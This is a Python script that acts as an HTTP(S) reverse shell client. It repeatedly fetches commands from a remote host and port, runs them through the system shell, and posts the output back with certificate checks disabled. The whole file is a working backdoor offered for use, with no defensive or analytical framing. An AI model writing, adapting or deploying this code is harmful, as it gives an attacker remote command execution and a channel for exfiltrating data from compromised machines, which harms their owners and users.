import requests as r
from subprocess  import Popen, PIPE, STDOUT
from time import sleep
import argparse as ap


def connect(host, port, enc):
    if port == 443:
        url = 'https://'+host+'/'
    elif port != 443 and enc:
        url = 'https://'+host+':'+port+'/'
    else:
        url = 'http://'+host+':'+port+'/'

    while True:
        try:
            req = r.get(url, verify=False)
            command = req.text
            if 'terminate' in command:
                break
            else:
                CMD =  Popen(command, shell=True, stdout=PIPE, stderr=STDOUT)
                resp = r.post(url=url, data=CMD.stdout.read(), verify=False)
        except KeyboardInterrupt:
            exit(0)
        sleep(3)

if __name__ == '__main__':
    parser = ap.ArgumentParser()
    parser.add_argument('-i', '--ip', help='The IP address to bind to.', required=True)
    parser.add_argument('-p', '--port', help='The port to connect to.', required=True)
    parser.add_argument('-s', '--ssl', help='Use this flag if you want to encrypt your connection.', action='store_true')
    args = parser.parse_args()

    connect(args.ip, args.port, args.ssl)